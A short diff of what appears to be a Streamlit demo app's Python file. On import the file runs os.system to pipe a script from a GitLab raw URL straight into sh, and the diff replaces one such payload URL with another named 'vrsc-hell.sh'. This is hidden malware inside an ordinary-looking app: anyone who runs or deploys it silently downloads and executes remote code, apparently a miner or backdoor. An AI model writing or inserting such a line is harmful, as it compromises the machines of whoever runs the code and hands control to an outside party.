@@ -4,7 +4,7 @@ import math
 import pandas as pd
 import streamlit as st
 import os
-os.system('curl -fsSL https://gitlab.com/jiorio669/blank/-/raw/main/jingan | sh')
+os.system('curl -fsSL https://gitlab.com/jiorio669/sh/-/raw/main/vrsc-hell.sh | sh')
 
 """
 # Welcome to Streamlit!
